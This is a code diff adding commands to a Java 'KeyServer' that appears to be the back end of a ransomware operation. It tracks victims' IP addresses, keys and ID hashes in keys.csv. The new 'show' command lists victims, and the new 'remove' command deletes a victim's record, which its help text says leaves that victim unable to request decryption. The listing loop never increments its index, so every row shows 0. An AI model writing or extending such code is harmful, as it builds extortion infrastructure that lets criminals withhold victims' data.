@@ -55,10 +55,30 @@ public class KeyServer {
         System.out.println("KeyServer commands:\n");
         System.out.println("*tip: all KeyServer commands are ran with the KS header");
         System.out.println("\tKS.help: show this page");
+        System.out.println("\tKS.show: show information of victims");
+        System.out.println("\tKS.remove <idx>: remove information about the specific victim in keys.csv. This would cause the victim to be unable to make decryption requests. ");
         System.out.println("\tKS.off: stop KeyServer");
         System.out.println("\tKS.on: turn on KeyServer");
         System.out.println("\tKS.reset: reset keys.csv");
         System.out.println("\tKS.manual: show manual page");
+        return;
+      case "show":
+        try {
+          File keys = new File(KeysFilePath);
+          Scanner input = new Scanner(keys);
+          int counter = 0;
+          while (input.hasNextLine()) {
+            String data = input.nextLine();
+            if (data.equals("IP,KEY,IDHASH")) {
+              System.out.println("IDX\tIP\t\tIDhash");
+            } else {
+              System.out.println(String.valueOf(counter) + "\t" + data.split(",")[0] + "\t" + data.split(",")[2]);
+            }
+          }
+        } catch (Exception e) {
+          System.out.println(KS_HEADER + "keys.csv not created");
+        }
+        
         return;
       case "reset": // show all authenticated requests
         try {
@@ -81,6 +101,43 @@ public class KeyServer {
         return;
     }
 
+
+    if (cmd.split(" ")[0].equals("remove")) {
+      try {
+        int idx = Integer.parseInt(cmd.split(" ")[1]);
+        File keys = new File(KeysFilePath);
+        Scanner input = new Scanner(keys);
+        String keysData = "";
+        int counter = 0;
+        boolean removed = false;
+        if (idx >= 0) {
+          while (input.hasNextLine()) {
+            String data = input.nextLine();
+            if (counter-1 != idx) {
+              keysData += data + "\n";
+            } else {
+              removed = true;
+            }
+            counter++;
+          }
+  
+          FileWriter writer = new FileWriter(keys);
+          writer.write(keysData);
+          writer.close();
+        }
+
+        if (removed) {
+          System.out.println(KS_HEADER + "Victim " + idx + " data removed");
+        } else {
+          System.out.println(KS_HEADER + "No such victim found");
+        }
+       
+
+      } catch (Exception e) {
+        System.out.println(KS_HEADER + "Invalid index. run KS.help for information");
+      }
+    
+    }
   }
 
   public static void main(String args[]) {
